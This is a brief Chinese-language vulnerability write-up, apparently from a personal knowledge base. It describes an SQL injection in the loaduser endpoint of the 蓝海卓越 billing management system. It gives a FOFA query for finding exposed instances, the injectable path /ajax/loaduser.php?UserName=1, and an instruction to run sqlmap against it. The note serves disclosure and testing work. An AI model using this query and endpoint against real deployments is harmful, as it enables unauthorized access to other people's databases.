# 蓝海卓越 计费管理系统loaduser存在SQL注入漏洞

# 一、漏洞简介
蓝海卓越计费管理系统loaduser存在SQL注入漏洞

# 二、影响版本
+ 蓝海卓越 计费管理系统

# 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征

![1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9.png](./img/ZuWWFOBczG1cMdE2/1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9-863677.png)

# 四、漏洞复现
```plain
/ajax/loaduser.php?UserName=1
```

直接sqlmap跑

![1716368373510-b0b02332-cdaa-484d-9bce-f89aae5681d2.png](./img/ZuWWFOBczG1cMdE2/1716368373510-b0b02332-cdaa-484d-9bce-f89aae5681d2-215575.png)



> 更新: 2024-05-23 12:33:24  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dp8fzx7t8uhgpsam>